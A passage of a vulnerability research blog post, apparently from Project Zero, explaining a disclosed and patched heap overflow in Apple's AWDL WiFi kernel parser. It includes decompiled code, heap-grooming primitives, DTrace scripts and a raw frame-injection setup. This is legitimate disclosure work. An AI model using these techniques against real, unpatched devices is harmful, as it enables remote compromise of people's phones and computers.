Secure system design didn't save the day because of the inevitable tradeoffs involved in building shippable products. Should such a complex parser driving multiple, complex state machines really be running in kernel context against untrusted, remote input? Ideally, no, and this was almost certainly flagged during a design review. But there are tight timing constraints for this particular feature which means isolating the parser is non-trivial. It's certainly possible, but that would be a major engineering challenge far beyond the scope of the feature itself. At the end of the day, it's features which sell phones and this feature is undoubtedly very cool; I can completely understand the judgement call which was made to allow this design despite the risks.
But risk means there are consequences if things don't go as expected. When it comes to software vulnerabilities it can be hard to connect the dots between those risks which were accepted and the consequences. I don't know if I'm the only one who found these vulnerabilities, though I'm the first to tell Apple about them and work with Apple to fix them. Over the next 30'000 words I'll show you what I was able to do with a single vulnerability in this attack surface and hopefully give you a new or renewed insight into the power of the weird machine.
I don't think all hope is lost; there's just an awful lot more left to do. In the conclusion I'll try to share some ideas for what I think might be required to build a more secure iPhone.
If you want to follow along you can find details [attached to issue 1982]( in the Project Zero issue tracker.
Vulnerability discovery
In 2018 [Apple shipped an iOS beta build without stripping function name symbols]( from the kernelcache. While this was almost certainly an error, events like this help researchers on the defending side enormously. One of the ways I like to procrastinate is to scroll through this enormous list of symbols, reading bits of assembly here and there. One day I was looking through IDA's cross-references to memmove with no particular target in mind when something jumped out as being worth a closer look:
IDA Pro's cross references window shows a large number of calls to memmove. A callsite in IO80211AWDLPeer::parseAwdlSyncTreeTLV is highlighted
Having function names provides a huge amount of missing context for the vulnerability researcher. A completely stripped 30+MB binary blob such as the iOS kernelcache can be overwhelming. There's a huge amount of work to determine how everything fits together. What bits of code are exposed to attackers? What sanity checking is happening and where? What execution context are different parts of the code running in?
In this case this particular driver is also available on MacOS, where function name symbols are not stripped.
There are three things which made this highlighted function stand out to me:
1) The function name:
At this point, I had no idea what AWDL was. But I did know that TLVs (Type, Length, Value) are often used to give structure to data, and parsing a TLV might mean it's coming from somewhere untrusted. And the [80211]( is a giveaway that this probably has something to do with WiFi. Worth a closer look. Here's the raw decompilation from [Hex-Rays]( which we'll clean up later:
__int64 __fastcall IO80211AWDLPeer::parseAwdlSyncTreeTLV(__int64 this, __int64 buf)
const void *v3; // x20
_DWORD *v4; // x21
int v5; // w8
unsigned __int16 v6; // w25
unsigned __int64 some_u16; // x24
int v8; // w21
__int64 v9; // x8
__int64 v10; // x9
unsigned __int8 *v11; // x21
v3 = (const void *)(buf + 3);
v4 = (_DWORD *)(this + 1203);
v5 = *(_DWORD *)(this + 1203);
if ( ((v5 + 1) & 0xFFFFu) <= 0xA )
v6 = v5 + 1;
v6 = 10;
some_u16 = *(unsigned __int16 *)(buf + 1) / 6uLL;
if ( (_DWORD)some_u16 == v6 )
some_u16 = v6;
"Peer %02X:%02X:%02X:%02X:%02X:%02X: PATH LENGTH error hc %u calc %u \n",
*(unsigned __int8 *)(this + 32),
*(unsigned __int8 *)(this + 33),
*(unsigned __int8 *)(this + 34),
*(unsigned __int8 *)(this + 35),
*(unsigned __int8 *)(this + 36),
*(unsigned __int8 *)(this + 37),
*v4 = some_u16;
v6 = some_u16;
v8 = memcmp((const void *)(this + 5520), v3, (unsigned int)(6 * some_u16));
memmove((void *)(this + 5520), v3, (unsigned int)(6 * some_u16));
Definitely looks like it's parsing something. There's some fiddly byte manipulation; something which sort of looks like a bounds check and an error message.
2) The second thing which stands out is the error message string:
"Peer %02X:%02X:%02X:%02X:%02X:%02X: PATH LENGTH error hc %u calc %u\n"
Any kind of LENGTH error sounds like fun to me. Especially when you look a little closer...
3) The control flow graph.
Reading the code a bit more closely it appears that although the log message contains the word "error" there's nothing which is being treated as an error condition here. IO80211Peer::logDebug isn't a fatal logging API, it just logs the message string. Tracing back the length value which is passed to memmove, regardless of which path is taken we still end up with what looks like an arbitrary u16 value from the input buffer (rounded down to the nearest multiple of 6) passed as the length argument to memmove.
Can it really be this easy? Typically, in my experience, bugs this shallow in real attack surfaces tend to not work out. There's usually a length check somewhere far away; you'll spend a few days trying to work out why you can't seem to reach the code with a bad size until you find it and realize this was a CVE from a decade ago. Still, worth a try.
But what even is this attack surface?
A first proof-of-concept
A bit of googling later we learn that [awdl is a type of welsh poetry]( and also an acronym for an Apple-proprietary mesh networking protocol probably called Apple Wireless Direct Link. It appears to be used by [AirDrop]( amongst other things.
The first goal is to determine whether we can really trigger this vulnerability remotely.
We can see from the casts in the parseAwdlSyncTreeTLV method that the type-length-value objects have a single-byte type then a two-byte length followed by a payload value.
In IDA selecting the function name and going View -> Open subviews -> Cross references (or pressing 'x') shows IDA only found one caller of this method:
case 0x14u:
if (v109[20] >= 2)
goto LABEL_126;
IO80211AWDLPeer::parseAwdlSyncTreeTLV(this, bytes);
So 0x14 is probably the type value, and v109 looks like it's probably counting the number of these TLVs.
Looking in the list of function names we can also see that there's a corresponding BuildSyncTreeTlv method. If we could get two machines to join an AWDL network, could we just use the MacOS kernel debugger to make the SyncTree TLV very large before it's sent?
Yes, you can. Using two MacOS laptops and enabling AirDrop on both of them I used a kernel debugger to edit the SyncTree TLV sent by one of the laptops, which caused the other one to kernel panic due to an out-of-bounds memmove.
If you're interested in exactly how to do that take a look at the [original vulnerability report]( I sent to Apple on November 29th 2019. This vulnerability was fixed as CVE-2020-3843 on January 28th 2020 in iOS 13.1.1/MacOS 10.15.3.
Our journey is only just beginning. Getting from here to running an implant on an iPhone 11 Pro with no user interaction is going to take a while...
Prior Art
There are a series of papers from the [Secure Mobile Networking Lab at TU Darmstadt]( in Germany (also known as SEEMOO) which look at AWDL. The researchers there have done a considerable amount of reverse engineering (in addition to having access to some leaked Broadcom source code) to produce these papers; they are invaluable to understand AWDL and pretty much the only resources out there.
The first paper [One Billion Apples’ Secret Sauce: Recipe for the Apple Wireless Direct Link Ad hoc Protocol]( covers the format of the frames used by AWDL and the operation of the channel-hopping mechanism.
The second paper [A Billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link]( focuses more on Airdrop, one of the OS features which uses AWDL. This paper also examines how Airdrop uses Bluetooth Low Energy advertisements to enable AWDL interfaces on other devices.
The research group wrote an open source AWDL client called [OWL]( (Open Wireless Link). Although I was unable to get OWL to work it was nevertheless an invaluable reference and I did use some of their frame definitions.
What is AWDL?
AWDL is an Apple-proprietary mesh networking protocol designed to allow Apple devices like iPhones, iPads, Macs and Apple Watches to form ad-hoc peer-to-peer mesh networks. Chances are that if you own an Apple device you're creating or connecting to these transient mesh networks multiple times a day without even realizing it.
If you've ever used Airdrop, streamed music to your Homepod or Apple TV via Airplay or used your iPad as a secondary display with Sidecar then you've been using AWDL. And even if you haven't been using those features, if people nearby have been then it's quite possible your device joined the AWDL mesh network they were using anyway.
AWDL isn't a custom radio protocol; the radio layer is WiFi (specifically 802.11g and 802.11a).
Most people's experience with WiFi involves connecting to an infrastructure network. At home you might plug a WiFi access point into your modem which creates a WiFi network. The access point broadcasts a network name and accepts clients on a particular channel.
To reach other devices on the internet you send WiFi frames to the access point (1). The access point sends them to the modem (2) and the modem sends them to your ISP (3,4) which sends them to the internet:
The topology of a typical home network
To reach other devices on your home WiFi network you send WiFi frames to the access point and the access point relays them to the other devices:
WiFi clients communicate via an access point, even if they are within WiFi range of each other
In reality the wireless signals don't propagate as straight lines between the client and access point but spread out in space such that the two client devices may be able to see the frames transmitted by each other to the access point.
If WiFi client devices can already send WiFi frames directly to each other, then why have the access point at all? Without the complexity of the access point you could certainly have much more magical experiences which "just work", requiring no physical setup.
There are various protocols for doing just this, each with their own tradeoffs. [Tunneled Direct Link Setup]( (TDLS) allows two devices already on the same WiFi network to negotiate a direct connection to each other such that frames won't be relayed by the access point.
[Wi-Fi Direct]( allows two devices not already on the same network to establish an encrypted peer-to-peer Wi-Fi network, using [WPS]( to bootstrap a WPA2-encrypted ad-hoc network.
Apple's AWDL doesn't require peers to already be on the same network to establish a peer-to-peer connection, but unlike Wi-Fi Direct, AWDL has no built-in encryption. Unlike TDLS and Wi-Fi Direct, AWDL networks can contain more than two peers and they can also form a mesh network configuration where multiple hops are required.
AWDL has one more trick up its sleeve: an AWDL client can be connected to an AWDL mesh network and a regular AP-based infrastructure network at the same time, using only one Wi-Fi chipset and antenna. To see how that works we need to look a little more at some Wi-Fi fundamentals.
Wi-Fi Direct
Requires AP network
Peer Limit
Concurrent AP Connection Possible
WiFi fundamentals
There are over 20 years of WiFi standards spanning different frequency ranges of the electromagnetic spectrum, from as low as [54MHz in 802.11af]( up to over [60GHz in 802.11ad]( Such networks are quite esoteric and consumer equipment uses frequencies near 2.4 Ghz or 5 Ghz. Ranges of frequencies are split into channels: for example in [802.11g]( channel 6 means a 22 Mhz range between 2.426 GHz and 2.448 GHz.
Newer 5 GHz standards like 802.11ac allow for wider channels up to 160 MHz; 5 Ghz channel numbers therefore encode both the center frequency and channel width. Channel 44 is a 20 MHz range between 5.210 Ghz and 5.230 Ghz whereas channel 46 is a 40 Mhz range which starts at the same lower frequency as channel 44 of 5.210 GHz but extends up to 5.250 GHz.
AWDL typically sends and receives frames on channel 6 and 44. How does that work if you're also using your home WiFi network on a different channel?
Channel Hopping and Time Division Multiplexing
In order to appear to be connected to two separate networks on separate frequencies at the same time, AWDL-capable devices split time into 16ms chunks and tell the WiFi controller chip to quickly switch between the channel for the infrastructure network and the channel being used by AWDL:
A typical AWDL channel hopping sequence, alternating between small periods on AWDL social channels and longer periods on the AP channel
The actual channel sequence is dynamic. Peers broadcast their channel sequences and adapt their own sequence to match peers with which they wish to communicate. The periods when an AWDL peer is listening on an AWDL channel are known as Availability Windows.
In this way the device can appear to be connected to the access point whilst also participating in the AWDL mesh at the same time. Of course, frames might be missed from both the AP and the AWDL mesh but the protocols are treating radio as an unreliable transport anyway so this only really has an impact on throughput. A large part of the AWDL protocol involves trying to synchronize the channel switching between peers to improve throughput.
The [SEEMOO labs paper]( has a much more detailed look at the AWDL channel hopping mechanism.
AWDL frames
These are the first software-controlled fields which go over the air in a WiFi frame:
struct ieee80211_hdr {
uint16_t frame_control;
uint16_t duration_id;
struct ether_addr dst_addr;
struct ether_addr src_addr;
struct ether_addr bssid_addr;
uint16_t seq_ctrl;
} __attribute__((packed));
The first word contains fields which [define the type of this frame]( These are broadly split into three frame families: Management, Control and Data. The building blocks of AWDL use a subtype of Management frames called [Action frames](
The address fields in an 802.11 header can have different meanings depending on the context; for our purposes the first is the destination device MAC address, the second is the source device MAC and the third is the MAC address of the infrastructure network access point or BSSID.
Since AWDL is a peer-to-peer network and doesn't use an access point, the BSSID field of an AWDL frame is set to the hard-coded AWDL BSSID MAC of 00:25:00:ff:94:73. It's this BSSID which AWDL clients are looking for when they're trying to find other peers. Your router won't accidentally use this BSSID because Apple owns the 00:25:00[OUI](
The format of the bytes following the header depends on the frame type. For an Action frame the next byte is a category field. There are [a large number of categories]( which allow devices to exchange all kinds of information. For example category 5 covers[various types of radio measurements]( like noise histograms.
The special category value 0x7f defines this frame as a vendor-specific action frame meaning that the next three bytes are the OUI of the vendor responsible for this custom action frame format.
[Apple owns the OUI 0x00 0x17 0xf2]( and this is the OUI used for AWDL action frames. Every byte in the frame after this is now proprietary, defined by Apple rather than an IEEE standard.
The SEEMOO labs team have done a great job reversing the AWDL action frame format and [they developed a wireshark dissector](
AWDL Action frames have a fixed-sized header followed by a variable length collection of TLVs:
The layout of fields in an AWDL frame: 802.11 header, action frame header, AWDL fixed header and variable length AWDL payload
Each TLV has a single-byte type followed by a two-byte length which is the length of the variable-sized payload in bytes.
There are two types of AWDL action frame: Master Indication Frames (MIF) and Periodic Synchronization Frames (PSF). They differ only in their type field and the collection of TLVs they contain.
An AWDL mesh network has a single master node decided by an election process. Each node broadcasts a MIF containing a master metric parameter; the node with the highest metric becomes the master node. It is this master node's PSF timing values which should be adopted as the true timing values for all the other nodes to synchronize to; in this way their availability windows can overlap and the network can have a higher throughput.
Frame processing
Back in 2017, Project Zero researcher Gal Beniamini published a seminal 5-part blog post series entitled [Over The Air]( where he exploited a vulnerability in the Broadcom WiFi chipset to gain native code execution on the WiFi controller, then pivoted via an iOS kernel bug in the chipset-to-Application Processor interface to achieve arbitrary kernel memory read/write.
In that case, Gal targeted a vulnerability in the Broadcom firmware when it was parsing data structures related to TDLS. The raw form of these data structures was handled by the chipset firmware itself and never made it to the application processor.
In contrast, for AWDL the frames appear to be parsed in their entirety on the Application Processor by the kernel driver. Whilst this means we can explore a lot of the AWDL code, it also means that we're going to have to build the entire exploit on top of primitives we can build with the AWDL parser, and those primitives will have to be powerful enough to remotely compromise the device. Apple continues to ship new mitigations with each iOS release and hardware revision, and we're of course going to target the latest iPhone 11 Pro with the largest collection of these mitigations in place.
Can we really build something powerful enough to remotely defeat kernel pointer authentication just with a linear heap overflow in a WiFi frame parser? Defeating mitigations usually involves building up a library of tricks to help build more and more powerful primitives. You might start with a linear heap overflow and use it to build an arbitrary read, then use that to help build an arbitrary bit flip primitive and so on.
I've built a library of tricks and techniques like this for doing local privilege escalations on iOS but I'll have to start again from scratch for this brand new attack surface.
A brief tour of the AWDL codebase
The first two C++ classes to familiarize ourselves with are IO80211AWDLPeer and IO80211AWDLPeerManager. There's one IO80211AWDLPeer object for each AWDL peer which a device has recently received a frame from. A background timer destroys inactive IO80211AWDLPeer objects. There's a single instance of the IO80211AWDLPeerManager which is responsible for orchestrating interactions between this device and other peers.
Note that although we have some function names from the iOS 12 beta 1 kernelcache and the MacOS IO80211Family driver we don't have object layout information. Brandon Azad pointed out that the MacOS prelinked kernel image does contain some structure layout information in the __CTF.__ctf section which can be parsed by the dtrace ctfdump tool. Unfortunately this seems to only contain structures from the open source XNU code.
The sizes of [OSObject-based]( objects can easily be determined statically but the names and types of individual fields cannot. One of the most time-consuming tasks of this whole project was the painstaking process of reverse engineering the types and meanings of a huge number of the fields in these objects. Each IO80211AWDLPeer object is almost 6KB; that's a lot of potential fields. Having structure layout information would probably have saved months.
If you're a defender building a threat model don't interpret this the wrong way: I would assume any competent real-world exploit development team has this information; either from [images or devices with full debug symbols]( they have acquired with or without Apple's consent, insider access, or even just from monitoring every single firmware image ever publicly released to [check whether debug symbols were released by accident]( Larger groups could even have people dedicated to building custom reversing tools.
Six years ago I had hoped Project Zero would be able to get legitimate access to data sources like this. Six years later and I am still spending months reversing structure layouts and naming variables.
We'll take IO80211AWDLPeerManager::actionFrameInput as the point where untrusted raw AWDL frame data starts being parsed. There is actually a separate, earlier processing layer in the WiFi chipset driver but its parsing is minimal.
Each frame received while the device is listening on a social channel which was sent to the AWDL BSSID ends up at actionFrameInput, wrapped in an mbuf structure. Mbufs are an anachronistic data structure used for wrapping collections of networking buffers. [The mbuf API is the stuff of nightmares]( but that's not in scope for this blogpost.
The mbuf buffers are concatenated to get a contiguous frame in memory for parsing, then IO80211PeerManager::findPeer is called, passing the source MAC address from the received frame:
IO80211PeerManager::findPeer(struct ether_addr *peer_mac)
If an AWDL frame has recently been received from this source MAC then this function returns a pointer to an existing IO80211AWDLPeer structure representing the peer with that MAC. The IO80211AWDLPeerManager uses a fairly complicated priority queue data structure called IO80211CommandQueue to store pointers to these currently active peers.
If the peer isn't found in the IO80211AWDLPeerManager's queue of peers then a new IO80211AWDLPeer object is allocated to represent this new peer and it's inserted into the IO80211AWDLPeerManager's peers queue.
Once a suitable peer object has been found the IO80211AWDLPeerManager then calls the actionFrameReport method on the IO80211AWDLPeer so that it can handle the action frame.
This method is responsible for most of the AWDL action frame handling and contains most of the untrusted parsing. It first updates some timestamps then reads various fields from TLVs in the frame using the IO80211AWDLPeerManager::getTlvPtrForType method to extract them directly from the mbuf. After this initial parsing comes the main loop which takes each TLV in turn and parses it.
First each TLV is passed to IO80211AWDLPeer::tlvCheckBounds. This method has a hardcoded list of specific minimum and maximum TLV lengths for some of the supported TLV types. For types not explicitly listed it enforces a maximum length of 1024 bytes. I mentioned earlier that I often encounter code constructs which look like shallow memory corruption only to later discover a bounds check far away. This is exactly that kind of construct, and is in fact where Apple added a bounds check in the patch.
Type 0x14 (which has the vulnerability in the parser) isn't explicitly listed in tlvCheckBounds so it gets the default upper length limit of 1024, significantly larger than the 60 byte buffer allocated for the destination buffer in the IO80211AWDLPeer structure.
This pattern of separating bounds checks away from parsing code is fragile; it's too easy to forget or not realize that when adding code for a new TLV type it's also a requirement to update the tlvCheckBounds function. If this pattern is used, try to come up with a way to enforce that new code must explicitly declare an upper bound here. One option could be to ensure an enum is used for the type and wrap the tlvCheckBounds method in a pragma to temporarily enable clang's [-Wswitch-enum]( warning as an error:
 clang diagnostic push
 diagnostic error "-Wswitch-enum"
IO80211AWDLPeer::tlvCheckBounds(...) {
switch(tlv->type) {
case type_a:
case type_b:
 clang diagnostic pop
This causes a compilation error if the switch statement doesn't have an explicit case statement for every value of the tlv->type enum.
Static analysis tools like [Semmle]( can also help here. The [EnumSwitch]( class can be used like in [this example code]( to check whether all enum values are explicitly handled.
If the tlvCheckBounds checks pass then there is a switch statement with a case to parse each supported TLV:
inline parsing of serviceParam
inline parsing of ARPA
inline parser extracting 2 bytes
inlined parser of NSync
SyncTree vulnerability in context
Here's a cleaned up decompilation of the relevant portions of the parseAwdlSyncTreeTLV method which contains the vulnerability:
IO80211AWDLPeer::parseAwdlSyncTreeTLV(awdl_tlv* tlv)
u64 new_sync_tree_size;
u32 old_sync_tree_size = this->n_sync_tree_macs + 1;
if (old_sync_tree_size >= 10 ) {
old_sync_tree_size = 10;
if (old_sync_tree_size == tlv->len/6 ) {
new_sync_tree_size = old_sync_tree_size;
} else {
new_sync_tree_size = tlv->len/6;
this->n_sync_tree_macs = new_sync_tree_size;
memcpy(this->sync_tree_macs, &tlv->val[0], 6 * new_sync_tree_size);
sync_tree_macs is a 60-byte inline array in the IO80211AWDLPeer structure, at offset +0x1648. That's enough space to store 10 MAC addresses. The IO80211AWDLPeer object is 0x16a8 bytes in size which means it will be allocated in the kalloc.6144 zone.
tlvCheckBounds will enforce a maximum value of 1024 for the length of the SyncTree TLV. The TLV parser will round that value down to the nearest multiple of 6 and copy that number of bytes into the sync_tree_macs array at +0x1648. This will be our memory corruption primitive: a linear heap buffer overflow in 6-byte chunks which can corrupt all the fields in the IO80211AWDLPeer object past +0x16a8 and then a few hundred bytes off of the end of the kalloc.6144 zone chunk. We can easily cause IO80211AWDLPeer objects to be allocated next to each other by sending AWDL frames from a large number of different spoofed source MAC addresses in quick succession. This gives us four rough primitives to think about as we start to find a path to exploitation:
1) Corrupting fields after the sync_tree_macs array in the IO80211AWDLPeer object:
Overflowing into the fields at the end of the peer object
2) Corrupting the lower fields of an IO80211AWDLPeer object groomed next to this one:
Overflowing into the fields at the start of a peer object next to this one
3) Corrupting the lower bytes of another object type we can groom to follow a peer in kalloc.6144:
Overflowing into a different type of object next to this peer in the same zone
4) Meta-grooming the zone allocator to place a peer object at a zone boundary so we can corrupt the early bytes of an object from another zone:
Overflowing into a different type of object in a different zone
We'll revisit these options in greater detail soon.
Getting on the air
At this point we understand enough about the AWDL frame format to start trying to get controlled, arbitrary data going over the air and reach the frame parsing entrypoint.
I tried for a long time to get the open source academic OWL project to build and run successfully, sadly without success. In order to start making progress I decided to write my own AWDL client from scratch. Another approach could have been to write a MacOS kernel module to interact with the existing AWDL driver, which may have simplified some aspects of the exploit but also made others much harder.
I started off using an old [Netgear WG111v2]( WiFi adapter I've had for many years which I knew could do [monitor mode]( and [frame injection]( albeit only on 2.4 Ghz channels. It uses an [rtl8187]( chipset. Since I wanted to use the linux drivers for these adapters I bought a [Raspberry Pi 4B]( to run the exploit.
In the past I've used [Scapy]( for crafting network packets from scratch. Scapy can [craft and inject arbitrary 802.11 frames]( but since we're going to need a lot of control over injection timing it might not be the best tool. Scapy uses [libpcap]( to interact with the hardware to inject raw frames so I took a look at libpcap. Some googling later I found [this excellent tutorial example]( which demonstrates exactly how to use libpcap to inject a raw 802.11 frame. Let dissect exactly what's required:
We've seen the structure of the data in 802.11 AWDL frames; there will be an ieee80211 header at the start, an Apple OUI, then the AWDL action frame header and so on. If our WiFi adaptor were connected to a WiFi network, this might be enough information to transmit such a frame. The problem is that we're not connected to any network. This means we need to attach some metadata to our frame to tell the WiFi adaptor exactly how it should get this frame on to the air. For example, what channel and with what bandwidth and modulation scheme should it use to inject the frame? Should it attempt re-transmits until an ACK is received? What signal strength should it use to inject the frame?
[Radiotap]( is a standard for expressing exactly this type of frame metadata, both when injecting frames and receiving them. It's a slightly fiddly variable-sized header which you can prepend on the front of a frame to be injected (or read off the start of a frame which you've sniffed.)
Whether the radiotap fields you specify are actually respected and used depends on the driver you are using - a driver may choose to simply not allow userspace to specify many aspects of injected frames. Here's an example radiotap header captured from a AWDL frame using the built-in MacOS packet sniffer on a MacBook Pro. Wireshark has parsed the binary radiotap format for us:
Wireshark parses radiotap headers in pcaps and shows them in a human-readable form
From this radiotap header we can see a timestamp, the data rate used for transmission, the channel (5.220 GHz which is channel 44) and the modulation scheme ([OFDM]( We can also see an indication of the strength of the received signal and a measure of the noise.
The [tutorial gave the following radiotap header](
static uint8_t u8aRadiotapHeader[] = {
0x00, 0x00, // version
0x18, 0x00, // size
0x0f, 0x80, 0x00, 0x00, // included fields
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //timestamp
0x10, // add FCS
0x00,// rate
0x00, 0x00, 0x00, 0x00, // channel
0x08, 0x00, // NOACK; don't retry
With knowledge of radiotap and a basic header it's not too tricky to get an AWDL frame on to the air using the [pcap_inject]( interface and a wireless adaptor in monitor mode:
int pcap_inject(pcap_t *p, const void *buf, size_t size)
Of course, this doesn't immediately work and with some trial and error it seems that the rate and channel fields aren't being respected. Injection with this adaptor seems to only work at 1Mbps, and the channel specified in the radiotap header won't be the one used for injection. This isn't such a problem as we can still easily set the wifi adaptor channel manually:
iw dev wlan0 set channel 6
Injection at 1Mbps is exceptionally slow but this is enough to get a test AWDL frame on to the air and we can see it in Wireshark on another device in monitor mode. But nothing seems to be happening on a target device. Time for some debugging!
Debugging with DTrace
[The SEEMOO labs paper]( had already suggested setting some MacOS boot arguments to enable more verbose logging from the AWDL kernel driver. These log messages were incredibly helpful but often you want more information than you can get from the logs.
For the [initial report PoC]( I showed how to use the MacOS kernel debugger to modify an AWDL frame which was about to be transmitted. Typically, in my experience, the MacOS kernel debugger is exceptionally unwieldy and unreliable. Whilst you can [technically script it using lldb's python bindings]( I wouldn't recommend it.
Apple does have one trick up their sleeve however; [DTrace]( Where the MacOS kernel debugger is awful in my opinion, dtrace is exceptional. DTrace is a dynamic tracing framework originally developed by Sun Microsystems for Solaris. It's been ported to many platforms including MacOS and ships by default. It's the magic behind tools such as [Instruments]( DTrace allows you to hook in little snippets of tracing code almost wherever you want, both in userspace programs, and, amazingly, the kernel. Dtrace has its quirks. Hooks are written in the D language which doesn't have loops and the scoping of variables takes a little while to get your head around, but it's the ultimate debugging and reversing tool.
For example, I used this dtrace script on MacOS to log whenever a new IO80211AWDLPeer object was allocated, printing it's heap address and MAC address:
self char* mac;
fbt:com.apple.iokit.IO80211Family:_ZN15IO80211AWDLPeer21withAddressAndManagerEPKhP22IO80211AWDLPeerManager:entry {
self->mac = (char*)arg0;
printf("new AWDL peer: %02x:%02x:%02x:%02x:%02x:%02x allocation:%p", self->mac[0], self->mac[1], self->mac[2], self->mac[3], self->mac[4], self->mac[5], arg1);
Here we're creating two hooks, one which runs at a function entry point and the other which runs just before that same function returns. We can use the self-> syntax to pass variables between the entry point and return point and DTrace makes sure that the entries and returns match up properly.
We have to use the mangled C++ symbol in dtrace scripts; using c++filt we can see the demangled version:
$ c++filt -n _ZN15IO80211AWDLPeer21withAddressAndManagerEPKhP22IO80211AWDLPeerManager
IO80211AWDLPeer::withAddressAndManager(unsigned char const*, IO80211AWDLPeerManager*)
The entry hook "saves" the pointer to the MAC address which is passed as the first argument; associating it with the current thread and stack frame. The return hook then prints out that MAC address along with the return value of the function (arg1 in a return hook is the function's return value) which in this case is the address of the newly-allocated IO80211AWDLPeer object.
With DTrace you can easily prototype custom heap logging tools. For example if you're targeting a particular allocation size and wish to know what other objects are ending up in there you could use something like the following DTrace script:
BEGIN {
target_size_min = 97;
target_size_max = 128;
fbt:mach_kernel:kalloc_canblock:entry {
self->size = *(uint64_t*)arg0;
self->size <= target_size_max /
printf("target allocation %x = %x", self->size, arg1);
The expression between the two /'s allows the hook to be conditionally executed. In this case limiting it to cases where kalloc_canblock has been called with a size between target_size_min and target_size_max. The built-in stack() function will print a stack trace, giving you some insight into the allocations within a particular size range. You could also use ustack() to continue that stack trace in userspace if this kernel allocation happened due to a syscall for example.
DTrace can also safely dereference invalid addresses without kernel panicking, making it very useful for prototyping and debugging heap grooms. With some ingenuity it's also possible to do things like dump linked-lists and monitor for the destruction of particular objects.
I'd really recommend spending some time learning DTrace; once you get your head around its esoteric programming model you'll find it an immensely powerful tool.
Reaching the entrypoint
Using DTrace to log stack frames I was able to trace the path legitimate AWDL frames took through the code and determine how far my fake AWDL frames made it. Through this process I discovered that there are, at least on MacOS, two AWDL parsers in the kernel: the main one we've already seen inside the IO80211Family kext and a second, much simpler one in the driver for the particular chipset being used. There were three checks in this simpler parser which I was failing, each of which meant my fake AWDL frames never made it to the IO80211Family code:
Firstly, the source MAC address was being validated. MAC addresses actually contain multiple fields:
The first half of a MAC address is an OUI. The least significant bit of the first byte defines whether the address is multicast or unicast. The second bit defines whether the address is locally administered or globally unique.
Diagram used under [CC BY-SA 2.5]( By Inductiveload, modified/corrected by Kju - SVG drawing based on PNG uploaded by User:Vtraveller. This can be found on Wikipedia [here](
The source MAC address 01:23:45:67:89:ab from the libpcap example was an unfortunate choice as it has the multicast bit set. AWDL only wants to deal with unicast addresses and rejects frames from multicast addresses. Choosing a new MAC address to spoof without that bit set solved this problem.
The next check was that the first two TLVs in the variable-length payload section of the frame must be a type 4 (sync parameters) then a type 6 (service parameters.)
Finally the channel number in the sync parameters had to match the channel on which the frame had actually been received.
With those three issues fixed I was finally able to get arbitrary controlled bytes to appear at the actionFrameReport method on a remote device and the next stage of the project could begin.
A framework for an AWDL client
We've seen that AWDL uses time division multiplexing to quickly switch between the channels used for AWDL (typically 6 and 44) and the channel used by the access point the device is connected to. By parsing the AWDL synchronization parameters TLV in the PSF and MIF frames sent by AWDL peers you can calculate when they will be listening in the future. The OWL project uses the linux [libev]( library to try to only transmit at the right moment when other peers will be listening.
There are a few problems with this approach for our purposes:
Firstly, and very importantly, this makes targeting difficult. AWDL action frames are (usually) sent to a broadcast destination MAC address (ff:ff:ff:ff:ff:ff.) It's a mesh network and these frames are meant to be used by all the peers for building up the mesh.
Whilst exploiting every listening AWDL device in proximity at the same time would be an interesting research problem and make for a cool demo video, it also presents many challenges far outside the initial scope. I really needed a way to ensure that only devices I controlled would process the AWDL frames I sent.
With some experimentation it turned out that all AWDL frames can also be sent to unicast addresses and devices would still parse them. This presents another challenge as the AWDL virtual interface's MAC address is randomly generated each time the interface is activated. For testing on MacOS it suffices to run:
ifconfig awdl0
to determine the current MAC address. For iOS it's a little more involved; my chosen technique has been to sniff on the AWDL social channels and correlate signal strength with movements of the device to determine its current AWDL MAC.
There's one other important difference when you send an AWDL action frame to a unicast address: if the device is currently listening on that channel and receives the frame, it will send an [ACK]( This turns out to be extremely helpful. We will end up building some quite complex primitives using AWDL action frames, abusing the protocol to build a weird machine. Being able to tell whether a target device really received a frame or not means we can treat AWDL frames more like a reliable transport medium. For the typical usage of AWDL this isn't necessary; but our usage of AWDL is not going to be typical.
This ACK-sniffing model will be the building block for our AWDL frame injection API.
Acktually receiving ACKs
Just because the ACKs are coming over the air now doesn't mean we actually see them. Although the WiFi adaptor we're using for injection must be technically capable of receiving ACKs (as they are a fundamental protocol building block), being able to see them on the monitor interface isn't guaranteed.
A screenshot of wireshark showing a spoofed AWDL frame followed by an Acknowledgement from the target device.
The libpcap interface is quite generic and doesn't have any way to indicate that a frame was ACKed or not. It might not even be the case that the kernel driver is aware whether an ACK was received. I didn't really want to delve into the injection interface kernel drivers or firmware as that was liable to be a major investment in itself so I tried some other ideas.
ACK frames in 802.11g and 802.11a are timing based. There's a short window after each transmitted frame when the receiver can ACK if they received the frame. It's for this reason that ACK frames don't contain a source MAC address. It's not necessary as the ACK is already perfectly correlated with a source device due to the timing.
If we also listen on our injection interface in monitor mode we might be able to receive the ACK frames ourself and correlate them. As mentioned, not all chipsets and drivers actually give you all the management frames.
For my early prototypes, I managed to find a pair in my box of WiFi adaptors where one would successfully inject on 2.4ghz channels at 1Mbps and the other would successfully sniff ACKs on that channel at 1Mbps.
1Mbps is exceptionally slow; a relatively large AWDL frame ends up being on the air for 10ms or more at that speed, so if your availability window is only a few ms you're not going to get many frames per second. Still, this was enough to get going.
The injection framework I built for the exploit uses two threads, one for frame injection and one for ACK sniffing. Frames are injected using the try_inject function, which extracts the spoofed source MAC address and signals to the second sniffing thread to start looking for an ACK frame being sent to that MAC.
Using a [pthread condition variable]( the injecting thread can then wait for a limited amount of time during which the sniffing thread may or may not see the ACK. If the sniffing thread does see the ACK it can record this fact then signal the condition variable. The injection thread will stop waiting and can check whether the ACK was received.
Take a look at try_inject_internal in the exploit for the mutex and condition variable setup code for this.
There's a wrapper around try_inject called inject which repeatedly calls try_inject until it succeeds. These two methods allow us to do all the timing sensitive and insensitive frame injection we need.
These two methods take a variable number of pkt_buf_t pointers; a simple custom variable-sized buffer wrapper object. The advantage of this approach is that it allows us to quickly prototype new AWDL frame structures without having to write boilerplate code. For example, this is all the code required to inject a basic AWDL frame and re-transmit it until the target receives it:
WIFI(dst, src),
Investing a little bit of time building this API saved a lot of time in the long run and made it very easy to experiment with new ideas.
With an injection framework finally up and running we can start to think about how to actually exploit this vulnerability!
The new challenges on A12/A13
